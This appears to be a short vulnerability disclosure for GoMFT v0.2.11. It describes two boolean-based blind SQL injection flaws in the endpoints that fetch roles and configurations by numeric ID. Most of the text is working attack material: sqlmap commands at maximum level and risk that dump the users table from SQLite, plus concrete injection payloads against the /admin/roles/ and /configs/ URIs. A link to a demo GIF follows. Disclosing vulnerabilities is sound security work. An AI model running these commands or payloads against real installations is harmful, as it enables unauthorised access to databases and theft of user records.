In GoMFT v0.2.11, two distinct boolean-based blind SQL injection vulnerabilities exist in the HTTP endpoints that fetch role and configuration records by numeric ID. Both endpoints interpolate the supplied ID directly into an SQLite query without proper sanitization or use of parameterized queries, allowing an attacker to inject arbitrary SQL and infer database state via true/false responses


# command
```
sqlmap.py -r gomft_roles --level 5 --risk 3 --batch --dbms sqlite -D SQLite_masterdb -T users --dump
```

# Injection Details
```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://gomft.local.test/admin/roles/4) AND 9438=9438-- vdOw
---

```



# command
```
sqlmap -r gomft_config --level 5 --risk 3 --batch --dbms sqlite -D SQLite_masterdb -T users --dump
```

# Injection Details
```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://gomft.local.test/configs/1 AND 7492=7492
---
```

# Demo
![](https://github.com/4rdr/proofs/blob/main/gifs/gomft-v0.2.11-SQL-Injection-via-multiple.gif?raw=true)
